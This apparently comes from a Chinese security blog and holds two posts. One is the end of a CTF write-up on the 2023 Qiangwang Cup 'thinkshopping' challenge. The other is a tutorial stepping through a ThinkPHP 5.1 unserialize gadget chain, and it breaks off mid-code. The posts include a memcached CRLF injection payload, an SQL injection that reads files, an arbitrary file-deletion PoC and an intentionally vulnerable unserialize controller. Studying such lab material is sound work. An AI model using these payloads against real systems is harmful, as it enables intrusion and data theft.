class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Request.php:1094, think\Request-&gt;filterValue()</span><br><span class="line">Request.php:1040, think\Request-&gt;input()</span><br><span class="line">Request.php:706, think\Request-&gt;get()</span><br><span class="line">Memcache.php:66, think\cache\driver\Memcache-&gt;has()</span><br><span class="line">Memcache.php:98, think\cache\driver\Memcache-&gt;set()</span><br><span class="line">Memcached.php:102, think\session\driver\Memcached-&gt;write()</span><br><span class="line">Output.php:154, think\console\Output-&gt;write()</span><br><span class="line">Output.php:143, think\console\Output-&gt;writeln()</span><br><span class="line">Output.php:124, think\console\Output-&gt;block()</span><br><span class="line">Output.php:212, call_user_func_array:&#123;thinkphp/library/think/console/Output.php:212&#125;()</span><br><span class="line">Output.php:212, think\console\Output-&gt;__call()</span><br><span class="line">Model.php:912, think\console\Output-&gt;getAttr()</span><br><span class="line">Model.php:912, think\model\Pivot-&gt;toArray()</span><br><span class="line">Model.php:936, think\model\Pivot-&gt;toJson()</span><br><span class="line">Model.php:2267, think\model\Pivot-&gt;__toString()</span><br><span class="line">Windows.php:163, file_exists()</span><br><span class="line">Windows.php:163, think\process\pipes\Windows-&gt;removeFiles()</span><br><span class="line">Windows.php:59, think\process\pipes\Windows-&gt;__destruct()</span><br></pre></td></tr></table></figure><p>参考：<a href="https://igml.top/2021/09/28/2021-0CTF-FINAL/">2021 0CTF FINAL wp</a></p><h1 id="thinkshopping"><a href="#thinkshopping" class="headerlink" title="thinkshopping"></a>thinkshopping</h1><p>和上一题相同给了附件 先把环境本地搭起来</p><p>这一题和上一题不同的是没有了插入账号密码这条数据了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702974066962-dff9e6bb-463a-4f0f-95dd-fabfc5e9aa22.png" alt="img"></p><p>并且反序列化入口地址也被删除了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702974868120-7a71d779-fe2a-428e-9af9-796aa473f4e7.png" alt="img"></p><p>最重要的是mysql的secure_file_priv为空 那么这个值不为空的时候比如被设置为<code>/var/lib/mysql-files/</code></p><p>那么用户只能使用<code> LOAD DATA</code> 和 <code>SELECT ... INTO OUTFILE </code>将文件保存到或者从<code>/var/lib/mysql-files/ </code>目录中</p><p>为空则表示没有限制了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702974362330-1f194402-43f5-40b4-a5a1-49d8f11268c8.png" alt="img"></p><p>那么我们就可以用sql注入来任意文件读取了</p><p>但关键是我们该如何登录呢</p><p>我们再来看一眼start.sh  可以看到是在11211端口启动了memcached 那么这是什么呢 它是一个内存数据库 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702975001753-fb10f6df-577c-4b61-b1e4-7369b1a6154d.png" alt="img"></p><p>并且也配置了cache使用memcached做缓存</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702975747424-2f9e8e08-74a7-44f9-a925-e56bd17954c3.png" alt="img"></p><p>登录的时候 使用了cache获取缓存</p><p>跟进find函数 此处调用了memcache的get指令</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702975946864-223a0edb-5233-425f-b630-f2deed26e9a1.png" alt="img"></p><p>并且根据<code>$key = &#39;think:&#39; . $this-&gt;connection-&gt;getConfig(&#39;database&#39;) . &#39;.&#39; . (is_array($options[&#39;table&#39;]) ? key($options[&#39;table&#39;]) : $options[&#39;table&#39;]) . &#39;|&#39; . $data;</code></p><p>缓存的key格式为<code>think:shop.admin|username</code></p><p>那么怎样控制缓存的值 memcached存在CRLF注入漏洞 参考：<a href="https://www.freebuf.com/vuls/328384.html">php-memcached CRLF绕过 - FreeBuf网络安全行业门户</a></p><p>通俗来看就是可以通过set设置任意值 比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TOKEN%00%0D%0Aset%20snowwolf%200%20500%204%0D%0Awolf</span><br><span class="line">等价于</span><br><span class="line">set snowwolf 0 500 4</span><br><span class="line">wolf</span><br></pre></td></tr></table></figure><p>根据大头师傅的方法可以得到memcacged的值的样子[<a href="https://mp.weixin.qq.com/s/7GY8b9GbR1raU1V5gDTBaQ">CTF复现计划]2023强网杯初赛 thinkshop[ping]</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">telnet 127.0.0.1 11211</span><br><span class="line">get think:shop.admin|admin</span><br><span class="line">a:1:&#123;i:0;a:3:&#123;s:2:&quot;id&quot;;i:1;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:32:&quot;21232f297a57a5a743894a0e4a801fc3&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>除此之外根据大头师傅还有坑点：</p><blockquote><p>这里有个坑点，就是memcached本身是没有数据类型的，只有key-value的概念，存放的都是字符串，但是PHP编程语言给它给予了数据类型的概念（当flags为0为字符串，当flags4为数组等等），我们看一下memcached的set命令格式：</p><p>上图中的红色箭头所指向的4，就是下方的flags位置，也就是说，在PHP中，flags为4的缓存数据，被当做数组使用</p></blockquote><p>所以我们构造CRLF注入命令要把flags设置为4 也就是数组形式</p><p>构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin%00%0D%0Aset%20think%3Ashop.admin%7Cadmin%204%20500%20101%0D%0Aa%3A3%3A%7Bs%3A2%3A%22id%22%3Bi%3A1%3Bs%3A8%3A%22username%22%3Bs%3A5%3A%22admin%22%3Bs%3A8%3A%22password%22%3Bs%3A32%3A%2221232f297a57a5a743894a0e4a801fc3%22%3B%7D&amp;password=admin</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702978743938-c087ad37-acc8-44dc-8d8d-4fe6b84a4ab0.png" alt="img"></p><p>然后登录抓包修改payload为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data`%3Dunhex(&#x27;&#x27;)/**/,`name`%3Dload_file(&#x27;/fffflllaaaagggg&#x27;)/**/where/**/id%3D1/**/or/**/1%3D1#=1</span><br></pre></td></tr></table></figure><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p>学习于各位厉害的师傅 跪拜：</p><p>[<a href="https://mp.weixin.qq.com/s/7GY8b9GbR1raU1V5gDTBaQ">CTF复现计划]2023强网杯初赛 thinkshop[ping]</a></p><p><a href="https://blog.wm-team.cn/index.php/archives/69/">强网杯 2023 By W&amp;M - W&amp;M Team</a></p><p><a href="https://igml.top/2021/09/28/2021-0CTF-FINAL/">2021 0CTF FINAL wp</a></p>]]></content>
      
      
      <categories>
          
          <category> 各赛事WP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp5.0.x~5.2.x版本反序列化链挖掘学习</title>
      <link href="/post/60ce7176.html"/>
      <url>/post/60ce7176.html</url>
      
        <content type="html"><![CDATA[<p>Thinkphp5.0.x~5.2.x版本反序列化链挖掘学习</p><span id="more"></span><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="namespace命名空间和子命名空间"><a href="#namespace命名空间和子命名空间" class="headerlink" title="namespace命名空间和子命名空间"></a>namespace命名空间和子命名空间</h2><p>首先我们需要知道为什么需要命名空间呢？</p><p>在大型PHP项目中，可能存在大量的类，函数和常量，而这些可能来自不同的库和团队，为了避免冲突，php就引进了命名空间。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Animals\cat;</span><br><span class="line">class cat&#123;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        echo &quot;miao~&quot;.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$cat = new cat();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace Animals\dog;</span><br><span class="line">class dog&#123;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        echo &quot;wow&quot;.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$Dog = new dog();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace Animals\bird;</span><br><span class="line">class bird&#123;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        echo &quot;6&quot;.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$Bird = new bird();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>以上例子中 Animals就是一个命令空间 而cat dog bird 都是其子命名空间</p><p>在创建实例的时候这里也有讲究 </p><p>一种是直接在相关类之后进行创建实例 比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">namespace Animals\cat;</span><br><span class="line">class cat&#123;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        echo &quot;miao~&quot;.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$cat = new cat();</span><br></pre></td></tr></table></figure><p>一种是可以在任意地方创建 但是要加上命名空间 即：<code>\命名空间\子命令空间\class类名</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701506070640-a0e9e936-106b-44f6-85f1-ee981404a6f3.png" alt="img"></p><p>还有一个知识点是利用use 在这里可以理解为是require inlcude这样的函数 </p><p>即可以在当前命名空间使用引入其他命名空间</p><p>比如根据代码顺序 我们创建实例的代码都属于是bird命名空间里的</p><p>也就是bird无需指定命名空间 直接申明即可</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701506380739-b91e4da1-9830-4901-80af-9985cee77b0a.png" alt="img"></p><p>如果使用use 则直接创建实例时无需在之前加上命名空间了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701506494614-a124ea63-0308-4205-8957-45b55753a1bd.png" alt="img"></p><h2 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h2><p>通过关键字extends来实现</p><p>通过一个demo简单理解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class father&#123;</span><br><span class="line">    public $name = &quot;Tom&quot;;</span><br><span class="line">    public $age = 100;</span><br><span class="line">    public function saysomething()&#123;</span><br><span class="line">        echo &quot;father is saying&quot;.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function sleeping()&#123;</span><br><span class="line">        echo &quot;i am sleeping&quot;.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class son extends father&#123;</span><br><span class="line">    public $name = &quot;Lihua&quot;;</span><br><span class="line">    public function saysomething()&#123;</span><br><span class="line">        echo &quot;son is saying&quot;.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function parentsaying()&#123;</span><br><span class="line">        parent::saysomething();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$Son = new son;</span><br><span class="line">echo $Son-&gt;age.&quot;\n&quot;;</span><br><span class="line">$Son-&gt;saysomething();</span><br><span class="line">$Son-&gt;parentsaying();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701507164342-e144b983-4bd2-4d60-8122-a6250e50533d.png" alt="img"></p><p>可以看到子类会继承父类中的属性和方法，当然只限于（public和protected类型而private是无法继承也无法访问的）子类同名函数会覆盖父类，子类也可以通过<code>parent::method</code>访问父类被覆盖的方法。</p><h2 id="trait修饰符"><a href="#trait修饰符" class="headerlink" title="trait修饰符"></a>trait修饰符</h2><p>trait修饰符使得被修饰的类可以复用，增加了代码的复用性</p><p>即我们可以在一个类中包含一个被trait修饰的类 并且使用其方法和属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">trait test&#123;</span><br><span class="line">    public $a = &quot;ok&quot;;</span><br><span class="line">    public function test()&#123;</span><br><span class="line">        echo &quot;test\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class impl&#123;</span><br><span class="line">    use test;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;impl\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$t=new impl();</span><br><span class="line">$t-&gt;test();</span><br><span class="line">echo $t-&gt;a;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701507738113-fb2c8dff-3d2e-40fe-a6d3-33cde99fe838.png" alt="img"></p><p>还有一个b神例子也可以来理解一下 方便之后去调试thinkphp链子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace np1\A;</span><br><span class="line"></span><br><span class="line">use np2\A\Boogipop;</span><br><span class="line"></span><br><span class="line">class Z1d10t&#123;</span><br><span class="line">    use Boogipop;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;dawn_construct\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;?php</span><br><span class="line">namespace np2\A;</span><br><span class="line">require(&quot;2.php&quot;);</span><br><span class="line">use np1\A\Z1d10t;</span><br><span class="line">trait Boogipop&#123;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;tostring\n&quot;;</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new Z1d10t();</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701508172292-6203230e-df2e-41b6-96e6-83ae66b3fe69.png" alt="img"></p><p>可以看到我们用trait修饰了Boogipop类并且在Z1d10t中use复用了它</p><p>然后我们创建一个Z1d10t的类 并且直接输出他</p><p>那么我们知道当直接输出一个对象时候就会调用__toString魔术方法</p><p>但是Z1d10t中并没有__toStiring魔术方法而Boogipop类中有却被调用了 这就很神奇了</p><h1 id="5-1-x版本分析"><a href="#5-1-x版本分析" class="headerlink" title="5.1.x版本分析"></a>5.1.x版本分析</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li>php7.3.4+Xdebug+thinkphp5.1.37+phpstudy+phpstorm</li></ul><p>那么当然是看官方文档<a href="https://www.thinkphp.cn/doc">https://www.thinkphp.cn/doc</a></p><p>这里建议在安装时老老实实利用composer 用git的时候报了好多错</p><p>把下载的源码包放到phpstudy根目录下</p><p>然后就是phpstudy联动phpstorm 推荐一篇文章：<a href="https://blog.csdn.net/qq_62989306/article/details/126913050">phpstorm+phpstudy调试thinkphp_如何在phpstorm中调试php程序-CSDN博客</a></p><p>这里遇到的坑就是我composer下载指定thinkphp版本为5.1.37时 他自动下载为thinkphp5.1.42</p><p>折磨了我一下午 最终问gpt得到了解决方法</p><p>在我们下好thinkphp5.1.42目录下 有个composer.json 将原来的5.1.*改为指定的5.1.37</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701517846484-9322664c-576b-4862-a671-9f8c4d7b8029.png" alt="img"></p><p>然后 <code>composer update</code> 他就会自动重新帮我们拉取依赖 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701517905050-35a888c9-067e-45a8-ac54-df0d659b36cb.png" alt="img"></p><p>最终解决了 可以愉快的调试了</p><h2 id="挖掘"><a href="#挖掘" class="headerlink" title="挖掘"></a>挖掘</h2><p>首先我们需要设置一个触发点 将控制器中的index控制器修改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\index\controller;</span><br><span class="line"></span><br><span class="line">class Index</span><br><span class="line">&#123;</span><br><span class="line">    public function index($input=&quot;&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;ThinkPHP5_Unserialize:\n&quot;;</span><br><span class="line">        unserialize(base64_decode($input));</span><br><span class="line">        return &#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V5.1&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;12载初心不改（2006-2018） - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;eab4b9f840753f8e7&quot;&gt;&lt;/think&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function hello($name = &#x27;ThinkPHP5&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        return &#x27;hello,&#x27; . $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在反序列化入口函数处打一个断点</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701771728123-14c8df13-e5d2-454d-8f6f-26237ee644c5.png" alt="img"></p><p>先测试我们的poc 可以发现是可以正常触发的</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701771807938-8ed628fb-4a11-4ea4-a9a1-db0fe81e2f43.png" alt="img"></p><p>接下来一步步调试</p><p>首先是进入了Windows.php的Windows类的析构函数</p><p>我们观察poc 也可以发现最外层套的是<code>think\process\pipes\Windows</code>对象 因此首先会进入该对象<img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701772315555-d5626d78-382d-4f16-99f6-3d4a602589b0.png" alt="img"></p><p>这里windows类还继承了Pipes这个抽象类</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701772344277-6435c36f-0019-440b-a1df-394f527d018b.png" alt="img"></p><p>继续跟进 进入了removeFIles这个函数中</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701772458028-3eae1587-619c-45f4-a948-b29042e3c6d4.png" alt="img"></p><p>该方法会遍历files数组 然后删除</p><p>这里调用了一个<code>$this-&gt;files</code>并且$files是可控的因此这里还存在一个任意文件删除的漏洞</p><p>poc：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think\process\pipes;</span><br><span class="line"></span><br><span class="line">class Pipes&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Windows extends Pipes</span><br><span class="line">&#123;</span><br><span class="line">private $files = [];</span><br><span class="line"></span><br><span class="line">public function __construct()</span><br><span class="line">&#123;</span><br><span class="line">$this-&gt;files=[&#x27;需要删除文件的路径&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo base64_encode(serialize(new Windows()));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>file_exists</code>函数对<code>$filename</code>进行处理  并且此时<code>$filename</code>会被当作字符串string进行处理</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701773147093-5262c202-22e6-4d65-bb57-4cf9ebdae72e.png" alt="img"></p><p>并且根据我们的poc可知 我们传入的是 Pivot对象</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701773205554-8aeb5f36-68e4-4c53-8750-89cd614fe876.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701773248506-71e26aca-d9cb-40d7-9972-064416dc6897.png" alt="img"></p><p>那当一个对象当作字符串被处理时，会触发__toString魔术方法</p><p>继续跟进 发现难道不应该触发Pivot函数的__toString魔术方法吗 为什么会跳到Conversion对象</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701773714546-13e03ac3-a462-4633-92a3-9e59c7a4b68e.png" alt="img"></p><p>这里就用到了之前说的trait复用的知识点了</p><p>我们可以看到 Convertion被trait修饰了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701773898203-2f4d1683-7279-4aa4-97f3-29d28fd667ed.png" alt="img"></p><p>并且Pivot对象基类是Model 它内部没有toString魔术方法 </p><p>但是构造函数中调用的是父类的构造方法</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701774046856-246081eb-2a34-4ff6-8c3f-dc09dd85a82b.png" alt="img"></p><p>我们继续跟进Model类 可以发现它use了<code>model\concern\Conversion</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701775270704-d7d5025e-ece6-4412-a53c-0e18d905cfb6.png" alt="img"></p><p>因此Model复用了Conversion类 而它又是Pivot类的父类 </p><p>当Pivot对象被当作字符串输出的时候 就会调用Conversion类的toString方法</p><p>这也就是为什么我跟进链子到了 Converison类的tostring方法了 </p><p>思路清晰 继续</p><p>接着调用了toJson函数</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701775565756-3c86b4e4-0a76-4460-a8e9-23d85dc135a0.png" alt="img"></p><p>接着调用了toArray函数 然后转为了json字符串 继续跟进toArray</p><p>先遍历this-&gt;append属性 取出键值对 对应我们poc中的</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701775854515-40420207-d28d-4c61-86fb-026aedf3c565.png" alt="img"></p><p>key为Z1d10t</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701775999642-0e5e090f-8e16-436c-bf49-8f31f4aa886e.png" alt="img"></p><p>接着进入getRelation函数中</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701776064817-0cafd189-bcf1-41a7-b4a9-096cae286ecf.png" alt="img"></p><p>因为我们没有给<code>$this-&gt;relation</code>赋值 因此return null就结束并且出来了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701776176513-ca575be3-1319-4576-af3d-6f35ee28351d.png" alt="img"></p><p>接着进入getAttr函数</p><p>poc中我们将<code>$this-&gt;data</code>赋值为一个对象 因此return一个Request对象之后 就会退出该方法 出来</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701776480917-1ed0551f-cb6c-4d22-a302-eacaf644d712.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701847452355-9384cf4e-7e1d-44cb-a11d-320102b41f90.png" alt="img"></p><p><code>$relation</code>变为了Request对象 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701776652298-17f4b401-e97e-4293-9f0f-cd0dad786c79.png" alt="img"></p><p>调用<code>$relation-&gt;visible()</code> 并且参数为<code>[calc,calc.exe]</code>  而Requset类是没有visible函数的</p><p>因此会调用它的__call方法 </p><p>一般PHP中的__call方法都是用来进行容错或者是动态调用,所以一般会在__call方法中使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__call_user_func($method, $args) </span><br><span class="line">__call_user_func_array([$obj,$method], $args)</span><br></pre></td></tr></table></figure><p>我们跟进它</p><p>发现它调用 <code>call_user_func_array</code>方法 这可不是一个好方法:)</p><p>并且这里$hook是我们可控的 因此我们可以设计一个数组<code>$hook= &#123;“visable”=&gt;”任意method”&#125;</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701777056201-b2143552-59e9-49a5-88a2-70c0d3f5632d.png" alt="img"></p><p>但是在这里array_unshift函数在之前的<code>[calc,calc.exe]</code>数组开头中插入Request对象 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701777151041-f0aa6009-994d-4ac8-aa00-307fb4075910.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701777278378-bdcef651-2589-47c6-9af7-e41df72e38d6.png" alt="img"></p><p>我们知道<code>call_user_func_array</code>函数会把第一个参数作为回调函数调用，第二参数是一个数组，并且将数组作为回调函数的参数</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701778235498-ff04b99e-9809-47cb-a359-5531b29dd4d7.png" alt="img"></p><p><code>$this-&gt;hook</code>为一个数组并且我们可控 然后取键名为visible的值</p><p>那么我们只能是（偷的）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array([$obj,&quot;任意方法&quot;],[$this,任意参数])</span><br><span class="line">也就是</span><br><span 